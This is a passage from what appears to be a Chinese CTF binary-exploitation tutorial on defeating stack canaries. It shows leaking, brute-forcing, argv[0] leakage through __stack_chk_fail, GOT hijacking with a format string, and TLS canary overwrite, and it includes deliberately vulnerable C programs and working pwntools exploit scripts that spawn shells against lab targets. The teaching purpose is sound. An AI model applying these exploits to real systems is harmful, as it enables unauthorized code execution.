<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ex2.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getshell</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">2</span>;i++)&#123;</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">0x200</span>);</span><br><span class="line">        <span class="built_in">printf</span>(buf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Hello Hacker!"</span>);</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译为32位程序，开启<code>Canary</code>保护，关闭<code>PIE</code>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -m32 -fstack-protector -no-pie ex2.c -o ex2</span><br></pre></td></tr></table></figure>
<p>ida打开，在<code>vuln</code>处下断点，程序执行到这里时往栈上添加<code>Canary</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:565C5280 mov     eax, large gs:14h</span><br><span class="line">.text:565C5286 mov     [ebp+var_C], eax		;ebp+var_C&#x3D;FF80175C</span><br></pre></td></tr></table></figure>
<p>接着到<code>read</code>的位置</p>
<p><code>buf</code>的位置在<code>FF8016F8</code>，<code>Canary</code>的位置在<code>FF80175C</code>，<code>FF80175C-FF8016F8=0x64=100</code>个字节</p>
<p>也就是说输入100个字节在加上回车的一个0xa正好可以覆盖到<code>Canary</code>的低位字节。</p>
<p><code>Canary</code>设计为以字节 <code>\x00</code> 结尾，本意是为了保证 <code>Canary</code>可以截断字符串，想要打印出<code>Canary</code>就只有覆盖低位字节</p>
<p>得到<code>Canary</code>值后接下来就是普通的rop了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.binary = <span class="string">'ex2'</span></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">io = process(<span class="string">'./ex2'</span>)</span><br><span class="line"></span><br><span class="line">get_shell = ELF(<span class="string">"./ex2"</span>).sym[<span class="string">"getshell"</span>]</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">"Hello Hacker!\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak Canary</span></span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">100</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">"A"</span>*<span class="number">100</span>)</span><br><span class="line">Canary = u32(io.recv(<span class="number">4</span>))<span class="number">-0xa</span></span><br><span class="line">log.info(<span class="string">"Canary:"</span>+hex(Canary))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Bypass Canary</span></span><br><span class="line">payload = <span class="string">"\x90"</span>*<span class="number">100</span>+p32(Canary)+<span class="string">"\x90"</span>*<span class="number">12</span>+p32(get_shell)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="爆破canary">爆破Canary</h3>
<blockquote>
<p><em>pid_t fork</em>( <strong>void</strong>);</p>
<p>返回值： 若成功调用一次则返回两个值，子进程返回0，<a href="https://baike.baidu.com/item/父进程" target="_blank" rel="noopener">父进程</a>返回子进程ID；否则，出错返回-1</p>
<p>个现有进程可以调用fork函数创建一个新进程。由fork创建的新进程被称为子进程（child process）。fork函数被调用一次但返回两次。两次返回的唯一区别是子进程中返回0值而<a href="https://baike.baidu.com/item/父进程" target="_blank" rel="noopener">父进程</a>中返回子进程ID。</p>
<p>子进程是父进程的副本，它将获得父进程数据空间、堆、栈等资源的副本。注意，子进程持有的是上述存储空间的“副本”，这意味着父子进程间不共享这些存储空间。</p>
</blockquote>
<p>利用<code>fork</code>就可以进行对<code>Canary</code>的爆破</p>
<p>ida:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">__pid_t</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = fork();</span><br><span class="line">    <span class="keyword">if</span> ( v3 &lt; <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;	<span class="comment">//fork失败了就退出</span></span><br><span class="line">    <span class="keyword">if</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      wait(<span class="number">0</span>);	<span class="comment">//父进程卡在这里</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"welcome"</span>);	<span class="comment">//子进程执行漏洞</span></span><br><span class="line">      fun();</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"recv sucess"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"fork error"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>
<p>直接下断点调试的话是断在父进程里面，一直在wait()，可以先在fun()中的read()函数处下断点，接着去docker里面直接运行程序，从ida里面attach上去，此时里面有两个bin1，pid值较大的那一个就是子进程。</p>
<p>经过调试后，得知buf到<code>Canary</code>需要100字节，<code>Canary</code>到return地址需要12字节，编写exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">debug=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    io=process(<span class="string">"./bin1"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io=remote(<span class="string">"172.17.0.2"</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">canary=<span class="string">'\x00'</span></span><br><span class="line">io.recvuntil(<span class="string">"welcome\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        io.send(<span class="string">'a'</span>*<span class="number">100</span>+canary+chr(j))</span><br><span class="line">        tmp=io.recvuntil(<span class="string">"welcome\n"</span>)	//输出recv success之后还会输出welcome，所以根据welcome判断，recvall()不知道为什么会卡住</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"recv"</span> <span class="keyword">in</span> tmp:</span><br><span class="line">            canary+=chr(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">get_flag=<span class="number">0x0804863B</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">100</span>+canary+<span class="string">'a'</span>*<span class="number">12</span>+p32(get_flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> io.recvline()		//recvall也会卡住</span><br></pre></td></tr></table></figure>
<h3 id="stack-smashing-protection-ssp">Stack-smashing Protection (SSP)</h3>
<p>当<code>Canary</code>值比较不正确时，程序就会跳转到<code>__stack_chk_fail</code>，</p>
<h4 id="libc-2.23">Libc 2.23</h4>
<p>先看下<code>__stack_chk_fail</code>的源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// debug/stack_chk_fail.c</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> **__libc_argv attribute_hidden;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">__attribute__ ((noreturn))</span><br><span class="line">__stack_chk_fail (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">"stack smashing detected"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中调用了<code>__fortify_fail</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// debug/fortify_fail.c</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> **__libc_argv attribute_hidden;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">__attribute__ ((noreturn)) internal_function</span><br><span class="line">__fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">"*** %s ***: %s terminated\n"</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">"&lt;unknown&gt;"</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__fortify_fail)</span><br></pre></td></tr></table></figure>
<p><code>__fortify_fail</code> 调用<code>__libc_message</code> 打印错误信息和 <code>argv[0]</code> ,当输入的字符串长度足够长时，就可以覆盖到argv[0]，就可以通过报错泄露出信息。</p>
<h5 id="pwn-32c3ctf2015-readme">pwn 32C3CTF2015 readme</h5>
<p><img src="https://i.loli.net/2020/08/30/NfPR1YwvueUgyzx.png" alt="1561905867614" /></p>
<p>第一次的输入也就是<code>IO_gets()</code>存在缓冲区溢出漏洞，而第二次的输入将覆盖flag</p>
<p>虽然flag被覆盖掉了，但是程序中还存在一个flag，这个就涉及到了linux系统中elf文件的映射</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">gdb-peda$ b *0x0040080e</span><br><span class="line">Breakpoint 1 at 0x40080e</span><br><span class="line">gdb-peda$ r</span><br><span class="line">gdb-peda$ vmmap readme.bin</span><br><span class="line">Start              End                Perm    Name</span><br><span class="line">0x00400000         0x00401000         r-xp    /home/firmyy/readme.bin</span><br><span class="line">0x00600000         0x00601000         rw-p    /home/firmyy/readme.bin</span><br></pre></td></tr></table></figure>
<p>由此可以看出readme.bin被映射到到了两个地方，而只要在程序<code>0x00000000~0x00001000</code>内的数据，都会被映射到内存中，flag的位置在<code>0x00000D20</code>，也就是说flag也被映射到了<code>0x00400D20</code>和<code>0x006000D20</code>这两个内存地址当中，所以即使<code>0x006000D20</code>的被覆盖了，<code>0x00400D20</code>的也依旧存在。</p>
<p>由于要利用<code>__stack_chk_fail</code>泄露flag，需要找出<code>argv[0]</code>距离缓冲区的距离</p>
<p>gdb中直接在main函数处下断点：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0x4006d0 (sub    rsp,0x8)</span><br><span class="line">RBX: 0x0 </span><br><span class="line">RCX: 0x7ffff7fa9718 --&gt; 0x7ffff7faad80 --&gt; 0x0 </span><br><span class="line">RDX: 0x7fffffffe608 --&gt; 0x7fffffffe837 (&quot;SHELL&#x3D;&#x2F;bin&#x2F;bash&quot;)</span><br><span class="line">RSI: 0x7fffffffe5f8 --&gt; 0x7fffffffe826 (&quot;&#x2F;root&#x2F;readme.bin&quot;)</span><br><span class="line">RDI: 0x1 </span><br><span class="line">RBP: 0x4008b0 (push   r15)</span><br><span class="line">RSP: 0x7fffffffe518 --&gt; 0x7ffff7e1209b (&lt;__libc_start_main+235&gt;:	mov    edi,eax)</span><br><span class="line">RIP: 0x4006d0 (sub    rsp,0x8)</span><br><span class="line">R8 : 0x7ffff7faad80 --&gt; 0x0 </span><br><span class="line">R9 : 0x7ffff7faad80 --&gt; 0x0 </span><br><span class="line">R10: 0xfffffffffffff46b </span><br><span class="line">R11: 0x7ffff7e11fb0 (&lt;__libc_start_main&gt;:	push   r14)</span><br><span class="line">R12: 0x4006ee (xor    ebp,ebp)</span><br><span class="line">R13: 0x7fffffffe5f0 --&gt; 0x1 </span><br><span class="line">R14: 0x0 </span><br><span class="line">R15: 0x0</span><br><span class="line">EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x4006c0 &lt;_IO_gets@plt&gt;:	jmp    QWORD PTR [rip+0x20062a]        # 0x600cf0 &lt;_IO_gets@got.plt&gt;</span><br><span class="line">   0x4006c6 &lt;_IO_gets@plt+6&gt;:	push   0x9</span><br><span class="line">   0x4006cb &lt;_IO_gets@plt+11&gt;:	jmp    0x400620</span><br><span class="line">&#x3D;&gt; 0x4006d0:	sub    rsp,0x8</span><br><span class="line">   0x4006d4:	mov    rdi,QWORD PTR [rip+0x200665]        # 0x600d40 &lt;stdout&gt;</span><br><span class="line">   0x4006db:	xor    esi,esi</span><br><span class="line">   0x4006dd:	call   0x400660 &lt;setbuf@plt&gt;</span><br><span class="line">   0x4006e2:	call   0x4007e0</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7fffffffe518 --&gt; 0x7ffff7e1209b (&lt;__libc_start_main+235&gt;:	mov    edi,eax)</span><br><span class="line">0008| 0x7fffffffe520 --&gt; 0x0 </span><br><span class="line">0016| 0x7fffffffe528 --&gt; 0x7fffffffe5f8 --&gt; 0x7fffffffe826 (&quot;&#x2F;root&#x2F;readme.bin&quot;)</span><br><span class="line">0024| 0x7fffffffe530 --&gt; 0x100000000 </span><br><span class="line">0032| 0x7fffffffe538 --&gt; 0x4006d0 (sub    rsp,0x8)</span><br><span class="line">0040| 0x7fffffffe540 --&gt; 0x0 </span><br><span class="line">0048| 0x7fffffffe548 --&gt; 0x9266eaee5b02c2c9 </span><br><span class="line">0056| 0x7fffffffe550 --&gt; 0x4006ee (xor    ebp,ebp)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br></pre></td></tr></table></figure>
<p>其中，<code>0016| 0x7fffffffe528 --&gt; 0x7fffffffe5f8 --&gt; 0x7fffffffe826 ("/root/readme.bin")</code>就是argv[0]的地址了。</p>
<blockquote>
<p>argv 是 argument vector的缩写，表示传入main函数的参数序列或指针，并且第一个参数argv[0]一定是程序的名称，并且包含了程序所在的完整路径</p>
</blockquote>
<p>接下来运行到<code>_IO_gets</code>处，查看缓冲区的地址，计算得到要覆盖到<code>argv[0]</code>的话需要0x218个字节。</p>
<p>挂载程序：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ socat tcp4-listen:10001,reuseaddr,fork exec:.&#x2F;readme.bin,stderr</span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">"172.17.0.2"</span>, <span class="number">10001</span>)</span><br><span class="line">payload_1 = <span class="string">"A"</span>*<span class="number">0x218</span> + p64(<span class="number">0x400d20</span>)</span><br><span class="line">io.sendline(payload_1)</span><br><span class="line">payload_2 = <span class="string">"A"</span>*<span class="number">4</span></span><br><span class="line">io.sendline(payload_2)</span><br><span class="line"><span class="keyword">print</span> io.recvall()</span><br></pre></td></tr></table></figure>
<p>但是执行完payload后，执行的终端里没有打印出flag，而在服务器的终端中打印了出来</p>
<blockquote>
<p>特别注意要控制<code>LIBC_FATAL_STDERR_=1</code>让fortify_fail能够把输出作为stderr给我们。否则<code>fortify_fail</code>下层接的是<code>libc_message</code>，而<code>libc_message</code>调用的是<code>getenv</code>。</p>
<p>getenv就是从environ指针那里去找环境变量指针数组。</p>
<p>getenv如果发现这环境变量没设置，libc_message会syscall调用<code>open('/dev/tty')</code>，输出你是看不到的。</p>
<p><a href="https://bbs.pediy.com/thread-223664.htm" target="_blank" rel="noopener" class="uri">https://bbs.pediy.com/thread-223664.htm</a></p>
</blockquote>
<p>所以需要利用第二次的写入将<code>LIBC_FATAL_STDERR_=1</code>写入到环境变量中，这样自己的终端才可以接收到flag</p>
<p>payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">"172.17.0.2"</span>, <span class="number">10001</span>)</span><br><span class="line">payload_1 = <span class="string">"A"</span>*<span class="number">0x218</span> + p64(<span class="number">0x400d20</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x600d20</span>) </span><br><span class="line"><span class="comment">#p64(0)是argv[0]指针与环境变量之间的隔断。 </span></span><br><span class="line"><span class="comment">#p64(0x600d20)是第二次输出写入环境变量的指针</span></span><br><span class="line">io.sendline(payload_1)</span><br><span class="line">payload_2 = <span class="string">"LIBC_FATAL_STDERR_=1"</span></span><br><span class="line">io.sendline(payload_2)</span><br><span class="line"><span class="keyword">print</span> io.recvall()</span><br></pre></td></tr></table></figure>
<h4 id="libc-2.25">Libc 2.25</h4>
<p>然而在2.25中调用的函数有所改变</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//stack_chk_fail.c</span></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> **__libc_argv attribute_hidden;</span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">__attribute__ ((noreturn))</span><br><span class="line">__stack_chk_fail (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail_abort (<span class="literal">false</span>, <span class="string">"stack smashing detected"</span>);</span><br><span class="line">&#125;</span><br><span class="line">strong_alias (__stack_chk_fail, __stack_chk_fail_local)</span><br></pre></td></tr></table></figure>
<p>这里面调用了<code>__fortify_fail_abort</code> 而不是<code>__fortify_fail</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> **__libc_argv attribute_hidden;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">__attribute__ ((noreturn))</span><br><span class="line">__fortify_fail_abort (<span class="keyword">_Bool</span> need_backtrace, <span class="keyword">const</span> <span class="keyword">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  Don't pass down</span></span><br><span class="line"><span class="comment">     __libc_argv[0] if we aren't doing backtrace since __libc_argv[0]</span></span><br><span class="line"><span class="comment">     may point to the corrupted stack.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (need_backtrace ? (do_abort | do_backtrace) : do_abort,</span><br><span class="line">                    <span class="string">"*** %s ***: %s terminated\n"</span>,</span><br><span class="line">                    msg,</span><br><span class="line">                    (need_backtrace &amp;&amp; __libc_argv[<span class="number">0</span>] != <span class="literal">NULL</span></span><br><span class="line">                     ? __libc_argv[<span class="number">0</span>] : <span class="string">"&lt;unknown&gt;"</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">__attribute__ ((noreturn))</span><br><span class="line">__fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail_abort (<span class="literal">true</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">libc_hidden_def (__fortify_fail)</span><br><span class="line">libc_hidden_def (__fortify_fail_abort)</span><br></pre></td></tr></table></figure>
<p>函数 <code>__fortify_fail_abort()</code> 在第一个参数为 <code>false</code> 时不再进行栈回溯，直接以打印出字符串 <code>&lt;unknown&gt;</code> 结束，也就没有办法输出 <code>argv[0]</code> 了。</p>
<h3 id="劫持__stack_chk_fail函数">劫持__stack_chk_fail函数</h3>
<p><code>Canary</code>校验失败后会进入<code>__stack_chk_fail</code>函数中，<code>__stack_chk_fail</code>函数本身也是一个普通的延迟绑定函数，如果可以修改GOT表，就可以成功劫持到<code>__stack_chk_fail</code>函数。</p>
<p>题目代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//main</span></span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> format; <span class="comment">// [rsp+0h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init(*(_QWORD *)&amp;argc, argv, envp);</span><br><span class="line">  read_n((__int64)&amp;format, <span class="number">88u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;format, <span class="number">88L</span>L);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//backdoor</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>main</code>函数中存在格式化字符串漏洞，而程序本身自带一个后门。</p>
<p>checksec：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[*] '/root/ctf/canary/bin3/bin3'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p>有<code>Canary</code>，不能直接覆盖return地址。但可以覆盖<code>__stack_chk_fail</code>地址来达到相同效果。</p>
<p>先计算出buff到canary的距离为88字节，接着构造payload。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">%<span class="number">78</span>c%<span class="number">12</span>$hhn </span><br><span class="line">%<span class="number">186</span>c%<span class="number">13</span>$hhn</span><br><span class="line">%<span class="number">56</span>c%<span class="number">14</span>$hhn</span><br><span class="line">%<span class="number">192</span>c%<span class="number">15</span>$hhn</span><br><span class="line">aa</span><br><span class="line">\x20\x10\x60\x00</span><br><span class="line">\x21\x10\x60\x00</span><br><span class="line">\x22\x10\x60\x00</span><br><span class="line">\x23\x10\x60\x00</span><br></pre></td></tr></table></figure>
<p>因为程序是64位的，地址高位通常都有<code>\x00</code>，所以要放在后面，中间的两个字符<code>'a'</code>用来对齐。</p>
<p>payload:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line"><span class="comment">#p=process("./bin3")</span></span><br><span class="line">p=remote(<span class="string">"172.17.0.2"</span>,<span class="number">10001</span>)</span><br><span class="line">elf=ELF(<span class="string">"./bin3"</span>)</span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line"></span><br><span class="line">stack_chk_fail_got=elf.got[<span class="string">'__stack_chk_fail'</span>]</span><br><span class="line">backdoor=<span class="number">0x40084E</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"%78c%12$hhn%186c%13$hhn%56c%14$hhn%192c%15$hhnaa"</span></span><br><span class="line">payload+=p64(<span class="number">0x601020</span>)</span><br><span class="line">payload+=p64(<span class="number">0x601021</span>)</span><br><span class="line">payload+=p64(<span class="number">0x601022</span>)</span><br><span class="line">payload+=p64(<span class="number">0x601023</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(payload+<span class="string">"a"</span>*<span class="number">16</span>) <span class="comment">#构造好payload后还需要16个字节来覆盖Canary，触发__stack_chk_fail函数</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="覆盖tls中的canary">覆盖TLS中的Canary</h3>
<p><strong>线程局部存储</strong> (<strong>TLS</strong>) 是一种存储持续期（storage duration），对象的存储是在线程开始时分配，线程结束时回收，每个线程有该对象自己的实例。这种对象的链接性（linkage）可以是静态的也可是外部的。</p>
<p><code>Canary</code>在<code>fs:0x28</code>中，而<code>fs</code>寄存器指向的是当前栈的TLS结构，所以，当溢出字节足够多时，可以覆盖到<code>Canary</code>，达到绕过<code>Canary</code>的效果。</p>
<p>题目代码：</p>
<p>StarCTF2018 babystack</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">pthread_t</span> newthread; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">puts</span>(byte_400C96);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" #   #    ####    #####  ######"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"  # #    #    #     #    #"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"### ###  #          #    #####"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"  # #    #          #    #"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" #   #   #    #     #    #"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"          ####      #    #"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(byte_400C96);</span><br><span class="line">  pthread_create(&amp;newthread, <span class="number">0L</span>L, (<span class="keyword">void</span> *(*)(<span class="keyword">void</span> *))start_routine, <span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( pthread_join(newthread, <span class="number">0L</span>L) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"exit failure"</span>);</span><br><span class="line">    result = <span class="number">1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Bye bye"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
